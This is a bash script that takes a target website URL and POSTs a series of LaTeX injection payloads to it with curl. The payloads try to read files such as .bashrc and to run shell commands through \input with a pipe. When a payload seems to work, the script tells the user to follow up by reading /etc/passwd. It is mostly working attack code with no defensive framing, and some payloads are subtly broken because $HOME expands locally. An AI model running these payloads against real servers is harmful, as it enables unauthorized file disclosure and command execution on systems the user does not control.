#!/bin/bash

# Function to print messages in color
print_color() {
    case "$2" in
        "red") printf "\033[1;31m$1\033[0m\n";;
        "green") printf "\033[1;32m$1\033[0m\n";;
        "yellow") printf "\033[1;33m$1\033[0m\n";;
        *) printf "%s\n" "$1";;
    esac
}

# Function to test LaTeX Injection vulnerability
test_vulnerability() {
    target="$1"
    payloads=(
        "\$\\LaTeX$"
        "\$\\input{filename}$"
        "\$\\include{filename}$"
        "\$\\usepackage{filename}$"
        "\$\\input{var:filename}$"
        "\$\\include{var:filename}$"
        "\$\\usepackage{var:filename}$"
        "\$\\newread\\file\\openin\\file=$HOME/.bashrc\\input\\file\\closein$"
        "\$\\openin\\file=$HOME/.bashrc\\read\\file\\closein$"
        "\$\\input{|\"echo $HOME\"}$"
        "\$\\input{|\"ls /etc\"}$"
    )

    for payload in "${payloads[@]}"; do
        print_color "Testing payload: $payload" "green"
        result=$(curl -s -d "input=$payload" -X POST "$target" | grep -o "LaTeX")
        if [[ "$result" == "LaTeX" ]]; then
            print_color "The target website may be vulnerable to LaTeX Injection!" "yellow"
            print_color "Payload: $payload" "yellow"
            print_color "To test the vulnerability further, try injecting sensitive information." "yellow"
            print_color "For example, try injecting \\input{/etc/passwd} to read sensitive files." "yellow"
            return 0
        fi
        print_color "Payload $payload did not trigger vulnerability." "green"
    done

    print_color "The target website does not appear to be vulnerable to LaTeX Injection." "green"
}

# Main function
main() {
    print_color "Enter your target website url: " "green"
    read -r target
    print_color "Testing for LaTeX Injection vulnerability on $target..." "green"
    test_vulnerability "$target"
}

# Execute main function
main
